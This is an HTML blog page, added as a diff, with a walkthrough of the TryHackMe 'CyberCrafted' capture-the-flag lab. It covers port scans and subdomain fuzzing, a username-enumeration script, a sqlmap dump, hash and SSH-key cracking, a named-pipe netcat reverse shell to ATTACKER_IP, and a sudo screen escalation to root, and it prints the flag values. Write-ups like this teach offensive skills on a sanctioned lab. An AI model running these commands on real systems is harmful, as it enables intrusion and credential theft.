@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>CyberCrafted | Jenn Shagrin</title>
+<meta name="description" content="TryHackMe CTF — subdomain enumeration, steganography detour, differential error user enumeration, SQLi credential dump, SSH key theft, john passphrase crack, plaintext password in Minecraft plugin log, screen sudo privesc to root.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/cybercrafted.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<meta property="og:url" content="https://jennshaggy.github.io/cybercrafted.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="CyberCrafted">
+<meta property="og:description" content="TryHackMe CTF — SQLi credential dump, SSH key theft, Minecraft plugin log plaintext password, screen sudo privesc to root.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CyberCrafted">
+<meta name="twitter:description" content="TryHackMe CTF — SQLi credential dump, SSH key theft, Minecraft plugin log plaintext password, screen sudo privesc to root.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://iad.portfolio.instructure.com/shared/4c4c330d1376bf479a9cbb73190bad1a110fb33cf436c283" title="CIAT Portfolio" target="_blank" rel="noopener noreferrer">
+                    <span>CIAT Portfolio</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">CyberCrafted</h1>
+    <div class="post-description">TryHackMe CTF &mdash; Target is an in-development Minecraft server. I know nothing about Minecraft, but unleash me on some Windows 97 Minesweeper any day of the week and these kids won&rsquo;t know what to think.</div>
+  </header>
+
+  <div class="post-content">
+
+<hr>
+
+<h2>Port Enumeration</h2>
+
+<p>Added the target IP to <code>/etc/hosts</code> first. Then nmap:</p>
+
+<pre><code>nmap -p- -A -T4 -sV -sC TARGET_IP</code></pre>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 10.47.41 AM.png" alt="nmap scan showing three open ports" style="max-width:100%;margin:2rem 0;">
+
+<p>SSH open. Now the details, via rustscan for the full port range:</p>
+
+<pre><code>rustscan -r 1-65535 -a TARGET_IP -- -sV -sC -T4</code></pre>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 10.48.57 AM.png" alt="rustscan initial output" style="max-width:100%;margin:2rem 0;">
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 10.50.42 AM.png" alt="rustscan full service detection" style="max-width:100%;margin:2rem 0;">
+
+<p>Quite a bit of gold in this mineshaft.</p>
+
+<p>Three ports. SSH on 22, web on 80, and Minecraft on 25565.</p>
+
+<p>The Minecraft banner also broadcasts: <code>Minecraft 1.7.2 (Protocol: 127, Message: ...e-TryHackMe-..., Users: 0/1)</code>.</p>
+
+<hr>
+
+<h2>Subdomain Discovery</h2>
+
+<p>Started dirbuster in headless mode while I poked at the primary domain:</p>
+
+<pre><code>dirbuster -u http://cybercrafted.thm -l /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -g</code></pre>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 11.01.57 AM.png" alt="dirbuster running in headless mode" style="max-width:100%;margin:2rem 0;">
+
+<p>While it ran, I was already intrigued by what it was surfacing.</p>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 11.08.22 AM.png" alt="dirbuster surfacing /secret/ directory" style="max-width:100%;margin:2rem 0;">
+
+<p><code>/secret/</code>. It&rsquo;s like a button labeled &ldquo;don&rsquo;t touch.&rdquo;</p>
+
+<p>Traversed up to the parent directory. Excellent background image, by the way.</p>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 11.12.53 AM.png" alt="/secret/ directory index with images" style="max-width:100%;margin:2rem 0;">
+
+<p>And that&rsquo;s when <code>herobrine-3.jpg</code> caught my eye.</p>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 11.13.49 AM.png" alt="herobrine-3.jpg opened in browser" style="max-width:100%;margin:2rem 0;">
+
+<hr>
+
+<h2>Detour: Steganography</h2>
+
+<p><code>herobrine-3.jpg</code> was giving me steganography obfuscation vibes. This was likely off-path for this room, but I was here for it.</p>
+
+<pre><code>steghide info herobrine-3.jpeg</code></pre>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 11.19.15 AM.png" alt="steghide confirms embedded data in the image" style="max-width:100%;margin:2rem 0;">
+
+<p>Well, well. Embedded data confirmed, passphrase required.</p>
+
+<pre><code>stegseek herobrine-3.jpeg /usr/share/wordlists/rockyou.txt</code></pre>
+
+<p>I AM SO EXCITED. Let it be a dead end. I don&rsquo;t care. I have been waiting for this moment.</p>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 11.27.52 AM.png" alt="stegseek cracking the passphrase" style="max-width:100%;margin:2rem 0;">
+
+<p>Stegseek cracked the passphrase against rockyou.txt and extracted <code>herobrine.txt</code>. Inside: a Base32-encoded string.</p>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 11.31.11 AM.png" alt="extracted herobrine.txt with Base32 content" style="max-width:100%;margin:2rem 0;">
+
+<p>The chain so far:</p>
+
+<pre><code>JPEG &rarr; steghide (rijndael-128 CBC) &rarr; herobrine.txt &rarr; Base32 string</code></pre>
+
+<p>Decoded the Base32. It led nowhere in the context of this room. The Herobrine filename is a creepypasta reference (Minecraft lore built entirely on misdirection) and the decoded string never tied back to any credential, endpoint, or flag I encountered downstream. Classified as a red herring, almost certainly planted. Documented and moved on.</p>
+
+<p>Worth saying: chasing an off-path steganography hunch like this belongs in a CTF, not a scoped engagement. Time boxed, out-of-scope indicators flagged, and back to the actual target.</p>
+
+<p>Back on track.</p>
+
+<hr>
+
+<h2>Subdomain Enumeration</h2>
+
+<pre><code>ffuf -u http://cybercrafted.thm -H "Host: FUZZ.cybercrafted.thm" \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0</code></pre>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 12.38.25 PM.png" alt="ffuf subdomain enumeration results" style="max-width:100%;margin:2rem 0;">
+
+<p>Three subdomains: <code>admin</code>, <code>store</code>, <code>www</code>. Added all three to <code>/etc/hosts</code>.</p>
+
+<p>View source on the primary domain also revealed a developer note in the HTML: <em>&ldquo;A Note to the developers: Just finished up adding other subdomains, now you can work on them!&rdquo;</em> Confirms the subdomain finding and hints that the other hosts are the real attack surface.</p>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 12.47.16 PM.png" alt="developer note revealed in page source" style="max-width:100%;margin:2rem 0;">
+
+<hr>
+
+<h2>Admin Panel Recon</h2>
+
+<p>Hit <code>admin.cybercrafted.thm</code>. Login form. Intercepted the POST request with Burp and sent it to Repeater and Intruder.</p>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 12.55.27 PM.png" alt="Burp intercepting login POST to admin subdomain" style="max-width:100%;margin:2rem 0;">
+
+<p>As soon as I turned off Intercept, the URL changed to something very usable:</p>
+
+<pre><code>http://admin.cybercrafted.thm/?error=Incorrect%20username%20or%20password</code></pre>
+
+<p>Differential error response. Different URLs based on valid vs. invalid username is a textbook user enumeration oracle.</p>
+
+<hr>
+
+<h2>User Enumeration via Custom Python Script</h2>
+
+<p>Wrote a quick script to iterate through a names wordlist and flag any username that didn&rsquo;t return the incorrect-credentials error URL:</p>
+
+<pre><code>import requests
+
+url = "http://admin.cybercrafted.thm/login.php"
+wordlist = "/usr/share/seclists/Usernames/Names/names.txt"
+fail_string = "Incorrect username or password"
+
+with open(wordlist, "r") as f:
+    for i, username in enumerate(f):
+        username = username.strip()
+        try:
+            data = {"uname": username, "pwd": "wrongpassword"}
+            r = requests.post(url, data=data, allow_redirects=True, timeout=5)
+            if fail_string not in r.url and fail_string not in r.text:
+                print(f"[+] Possible valid username: {username}")
+            if i % 100 == 0:
+                print(f"[*] Tried {i} usernames...")
+        except requests.exceptions.RequestException:
+            pass</code></pre>
+
+<hr>
+
+<h2>SQL Injection on store.cybercrafted.thm</h2>
+
+<p>Before running the enumeration to completion, I checked the other subdomains. <code>store.cybercrafted.thm</code> itself returned 403, but a directory fuzz pointed me at <code>search.php</code>:</p>
+
+<pre><code>ffuf -u http://admin.cybercrafted.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php</code></pre>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 1.56.29 PM.png" alt="ffuf finding search.php" style="max-width:100%;margin:2rem 0;">
+
+<p>Visiting <code>store.cybercrafted.thm/search.php</code> returned a form begging for SQL injection.</p>
+
+<pre><code>sqlmap -u http://store.cybercrafted.thm/search.php --forms --dump</code></pre>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 2.20.17 PM.png" alt="sqlmap confirming SQLi on search.php" style="max-width:100%;margin:2rem 0;">
+
+<p>Sqlmap confirmed injection, dumped the database. A two-for-one special: admin username and password hash.</p>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 2.23.09 PM.png" alt="sqlmap dump showing credentials" style="max-width:100%;margin:2rem 0;">
+
+<p>Username: <code>xXUltimateCreeperXx</code>. Must have also been their MySpace handle. I bet they had lip piercings and a shag emo cut.</p>
+
+<p>Also recovered the first flag from the dump.</p>
+
+<hr>
+
+<h2>Hash Cracking</h2>
+
+<pre><code>hashcat -m 100 88b949dd5cdfbecb9f2ecbbfa24e5974234e7c01 /usr/share/wordlists/rockyou.txt</code></pre>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 2.29.41 PM.png" alt="hashcat cracking SHA1 to diamond123456789" style="max-width:100%;margin:2rem 0;">
+
+<p>Password: <code>diamond123456789</code>. Logged into the admin panel.</p>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 2.32.42 PM.png" alt="admin panel access confirmed" style="max-width:100%;margin:2rem 0;">
+
+<p>We&rsquo;re in.</p>
+
+<hr>
+
+<h2>Reverse Shell</h2>
+
+<p>Set up a netcat listener:</p>
+
+<pre><code>nc -lvnp 4444</code></pre>
+
+<p>In the authenticated admin browser session, dropped a named-pipe reverse shell pointing back at my attacker VM:</p>
+
+<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ATTACKER_IP 4444 &gt;/tmp/f</code></pre>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 2.38.03 PM.png" alt="reverse shell caught on netcat listener" style="max-width:100%;margin:2rem 0;">
+
+<p>Shell caught. Landed as <code>www-data</code>.</p>
+
+<p>Stabilized:</p>
+
+<pre><code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code></pre>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 2.59.01 PM.png" alt="stabilized shell with pty spawn" style="max-width:100%;margin:2rem 0;">
+
+<hr>
+
+<h2>SSH Key Theft</h2>
+
+<p>Located the Minecraft server directory, but <code>www-data</code> didn&rsquo;t have access. Checked <code>/etc/passwd</code> for real users to escalate to:</p>
+
+<pre><code>cat /etc/passwd | grep -v nologin | grep -v false</code></pre>
+
+<p>Two candidates: <code>xxultimatecreeperxx</code> and <code>cybercrafted</code>.</p>
+
+<p>Hunted for SSH keys:</p>
+
+<pre><code>find / -name "id_rsa" 2>/dev/null
+cat /home/xxultimatecreeperxx/.ssh/id_rsa</code></pre>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 3.03.05 PM.png" alt="encrypted RSA private key found in home directory" style="max-width:100%;margin:2rem 0;">
+
+<p>Encrypted RSA private key. Copied it to my attacker VM, <code>chmod 600</code>, and tried to SSH in.</p>
+
+<pre><code>ssh -i ~/id_rsa xxultimatecreeperxx@TARGET_IP</code></pre>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 3.13.08 PM.png" alt="SSH prompting for passphrase on encrypted key" style="max-width:100%;margin:2rem 0;">
+
+<p>Key is encrypted. Time for john.</p>
+
+<hr>
+
+<h2>Cracking the Key Passphrase</h2>
+
+<pre><code>ssh2john ~/id_rsa &gt; hash.txt
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 3.15.28 PM.png" alt="john cracking the SSH key passphrase" style="max-width:100%;margin:2rem 0;">
+
+<p>I was right again. This IS a MySpace name from 2006. Damn. I&rsquo;m on fire today.</p>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 3.19.11 PM.png" alt="SSH access as xxultimatecreeperxx" style="max-width:100%;margin:2rem 0;">
+
+<p>In as the user. Take that, MySpace creep. I was NOT lying when I said I wasn&rsquo;t single.</p>
+
+<pre><code>cat ~/user.txt</code></pre>
+
+<p>Minecraft server flag retrieved: <code>THM{ba93767ae3db9f5b8399680040a0c99e}</code></p>
+
+<hr>
+
+<h2>Pivoting to cybercrafted</h2>
+
+<p>The minecraft server directory had interesting plugin data:</p>
+
+<pre><code>ls /opt/minecraft/cybercrafted/plugins/LoginSystem/
+cat /opt/minecraft/cybercrafted/plugins/LoginSystem/passwords.yml</code></pre>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 3.27.29 PM.png" alt="LoginSystem plugin password file with MD5 hashes" style="max-width:100%;margin:2rem 0;">
+
+<p>Two MD5 hashes. Cracked one, but it didn&rsquo;t give me what I needed for the next user.</p>
+
+<p>Checked the log file:</p>
+
+<pre><code>cat /opt/minecraft/cybercrafted/plugins/LoginSystem/log.txt</code></pre>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 3.43.36 PM.png" alt="plaintext password in LoginSystem log file" style="max-width:100%;margin:2rem 0;">
+
+<p>Oh yes. Plaintext, baby. <code>JavaEdition&gt;Bedrock</code>.</p>
+
+<p>SSHing from inside an SSH. Like the matrix up in here.</p>
+
+<pre><code>ssh cybercrafted@TARGET_IP
+cat ~/user.txt</code></pre>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 3.47.44 PM.png" alt="second user flag retrieved" style="max-width:100%;margin:2rem 0;">
+
+<p>User flag: <code>THM{b4aa20aaf08f174473ab0325b24a45ca}</code></p>
+
+<hr>
+
+<h2>Screen Privilege Escalation to Root</h2>
+
+<pre><code>sudo -l</code></pre>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 3.49.46 PM.png" alt="sudo -l showing /usr/bin/screen as permitted" style="max-width:100%;margin:2rem 0;">
+
+<p><code>cybercrafted</code> can run <code>/usr/bin/screen</code> as root, no password. Classic screen-as-root privesc vector.</p>
+
+<p>Attached to the existing <code>cybercrafted</code> screen session:</p>
+
+<pre><code>sudo /usr/bin/screen -r cybercrafted</code></pre>
+
+<p>Landed inside the running Minecraft server console. Detach with <code>Ctrl+A</code> then <code>D</code>, reattach, then <code>Ctrl+A</code> then <code>C</code> to open a new shell window inside the screen session. That new shell inherits screen&rsquo;s privileges: root.</p>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 3.57.46 PM.png" alt="root shell via screen session" style="max-width:100%;margin:2rem 0;">
+
+<p>The root is ON FIRE.</p>
+
+<pre><code>cat /root/root.txt</code></pre>
+
+<img src="/images/cybercrafted/Screenshot 2026-04-21 at 3.58.22 PM.png" alt="root flag retrieved" style="max-width:100%;margin:2rem 0;">
+
+<p>Root flag: confirmed. Done.</p>
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<pre><code>nmap + rustscan &rarr; 3 open ports, Minecraft banner
+&rarr; dirbuster + ffuf subdomain enum &rarr; admin, store, www + /secret/ directory
+&rarr; steghide + stegseek on herobrine-3.jpg &rarr; Base32 (classified red herring)
+&rarr; Burp intercept on admin login &rarr; differential error URL user enum oracle
+&rarr; Custom Python enum script &rarr; valid username candidates
+&rarr; ffuf on admin subdomain &rarr; search.php
+&rarr; sqlmap on store.cybercrafted.thm/search.php &rarr; dump &rarr; xXUltimateCreeperXx + SHA1 hash + web flag
+&rarr; hashcat &rarr; diamond123456789 &rarr; admin panel login
+&rarr; mkfifo named-pipe reverse shell &rarr; www-data
+&rarr; pty.spawn shell stabilization
+&rarr; /home/xxultimatecreeperxx/.ssh/id_rsa &rarr; ssh2john &rarr; john &rarr; SSH as user
+&rarr; /opt/minecraft/.../LoginSystem/log.txt &rarr; plaintext password &rarr; ssh as cybercrafted
+&rarr; sudo -l &rarr; /usr/bin/screen NOPASSWD &rarr; screen session hijack &rarr; root shell &rarr; root flag</code></pre>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> ·
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
